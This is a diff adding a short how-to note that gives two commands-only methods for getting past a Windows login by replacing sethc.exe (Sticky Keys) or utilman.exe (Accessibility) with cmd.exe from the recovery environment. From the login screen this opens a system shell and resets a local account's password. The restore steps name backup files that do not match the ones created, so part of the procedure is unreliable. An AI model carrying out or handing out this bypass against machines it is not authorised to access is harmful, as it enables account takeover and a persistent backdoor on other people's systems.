@@ -1,0 +1,27 @@
+Method 1:
+copy c:\windows\system32\sethc.exe c:\windows\system32\sethc.exe.bak //backup sethc file.
+copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe /y //override with cmd.
+
+Press shift 5 time cmd will open then type:
+
+net localgroup administrators 
+net user hp * //change password
+exit
+
+After looging in go to the winre again. Open cmd and type:
+
+copy c:\windows\system32\sethc.bak c:\windows\system32\sethc.exe
+Done.
+
+Method 2:
+copy c:\windows\system32\utilman.exe c:\windows\system32\utilman.exe.bak //backup sethc file.
+copy c:\windows\system32\cmd.exe c:\windows\system32\utilman.exe /y //override with cmd.
+
+Click Accessibility icon cmd will open then type:
+net localgroup administrators 
+net user hp * //change password
+exit
+
+After looging in go to the winre again. Open cmd and type:
+copy c:\windows\system32\utilman.bak c:\windows\system32\utilman.exe
+Done.
